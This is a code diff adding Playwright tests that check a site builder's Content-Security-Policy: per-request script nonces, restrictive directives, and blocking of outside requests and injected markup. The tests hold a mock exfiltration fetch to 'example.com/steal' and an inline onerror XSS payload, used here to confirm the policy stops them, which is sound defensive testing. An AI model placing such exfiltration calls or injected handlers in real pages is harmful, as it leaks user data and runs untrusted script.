@@ -74,3 +74,56 @@ test.describe("The builder itself", () => {
     await request.delete(`/api/sites/${site.id}?permanent=1`);
   });
 });
+
+test.describe("What a page is allowed to load", () => {
+  test("carries a policy that names the scripts by a number of the day", async ({ request }) => {
+    const res = await request.get("/");
+    const csp = res.headers()["content-security-policy"];
+    expect(csp).toBeTruthy();
+
+    const nonce = /'nonce-([^']+)'/.exec(csp!)?.[1];
+    expect(nonce, "script-src should carry a nonce").toBeTruthy();
+
+    // Next stamps the same number onto its own scripts. A <script> that
+    // arrived inside somebody's content has no way to know it.
+    const html = await res.text();
+    expect(html).toContain(`nonce="${nonce}"`);
+
+    expect(csp).toContain("object-src 'none'");
+    expect(csp).toContain("base-uri 'self'");
+    expect(csp).toContain("frame-ancestors 'self'");
+  });
+
+  test("gives every request a different number", async ({ request }) => {
+    const nonceOf = async () =>
+      /'nonce-([^']+)'/.exec((await request.get("/")).headers()["content-security-policy"]!)?.[1];
+    expect(await nonceOf()).not.toBe(await nonceOf());
+  });
+
+  test("cannot talk to anywhere but this server", async ({ page }) => {
+    await page.goto("/");
+    await page.waitForTimeout(500);
+    const result = await page.evaluate(async () => {
+      try {
+        await fetch("https://example.com/steal?x=1", { mode: "no-cors" });
+        return "allowed";
+      } catch {
+        return "blocked";
+      }
+    });
+    // Exfiltration is what a page quietly posting elsewhere looks like.
+    expect(result).toBe("blocked");
+  });
+
+  test("will not run a handler that came in with the markup", async ({ page }) => {
+    await page.goto("/");
+    await page.waitForTimeout(500);
+    const ran = await page.evaluate(() => {
+      const host = document.createElement("div");
+      host.innerHTML = '<img src=x onerror="window.__X=1">';
+      document.body.appendChild(host);
+      return new Promise((r) => setTimeout(() => r((window as unknown as { __X?: number }).__X === 1), 400));
+    });
+    expect(ran).toBe(false);
+  });
+});
